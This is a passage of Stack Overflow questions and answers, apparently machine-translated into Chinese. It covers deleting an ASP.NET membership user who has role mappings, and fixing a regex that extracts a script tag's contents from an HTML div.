    //Commented this out because you will get a foreign key 
    //error if you try to delete the user without removing the 
    //the mapping of the user to a role
    //if (!roles.GetRolesForUser("test").Contains("Admin"))
    //{
    //    roles.AddUsersToRoles(new[] { "test" }, new[] { "admin" });
    //}

    //This will delete the user information from webpages_membership
    bool wasDeleted = membership.DeleteAccount("test");

    //This will delelet the user information form UserProfile
    wasDeleted = membership.DeleteUser("test", true); 
```

正如您从评论中看到的那样，如果您使用角色并且您将角色映射到该用户，这将不起作用。您需要先删除这些，然后才能删除用户。我知道这不是 zms6445 的问题，但我想把它放在那里给使用角色的人。

# regex - 正则表达式因 html 片段而失败

> ID：15232997
> 
> 赞同：2
> 
> 时间：2013-03-05T20:00:10.727
> 
> 标签：regex

我需要使用 RegEx 提取 HTML 标记的内容。我正在搜索的正文如下所示：

```
<div class="content">
    The Price is <script type="text/javascript">document.write(123())</script>
</div> 
```

我尝试使用此表达式，但失败了。我需要提取“document.write(123())”

```
(?s)<div class="content">[^<]*<script type="text/javascript">(.*?)</script></div> 
```

如何修改我的表达以获得我所追求的？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-05T20:07:43.580

您的正则表达式存在几个问题：

*   是什么`(?s)`？
*   你没有考虑和之间的`</script>`空间`</div>`
*   正斜杠 ( `/`) 我认为需要转义，即`\/`

这似乎有效（[**演示**](http://www.rubular.com/r/FA9KTcIBYk)）：

```
<div class="content">[^<]*<script type="text\/javascript">(.*?)<\/script>[^<]*<\/div> 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-05T20:08:38.963

你只是忘了考虑和之间的`<script>`空间`<div>`

`(?s)<div class="content">[^<]*<script type="text/javascript">(.*?)</script>\s*</div>`

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-03-05T20:09:25.157

使用正则表达式从 HTML 中提取内容无疑是一种疯狂的做法。这比使用 Regex 验证电子邮件地址的想法更糟糕。

如果您使用的是 C#/.NET，我可以推荐[HtmlAgility 包](http://htmlagilitypack.codeplex.com/)，它在从任何 HTML 中提取内容方面做得非常好（[StackOverflow 上有一个很好的答案](https://stackoverflow.com/questions/846994/how-to-use-html-agility-pack)，显示了如何使用它）。

如果您正在使用其他技术，只需寻找做同样事情的替代库 - 您肯定会发现其他人已经解决了这个问题。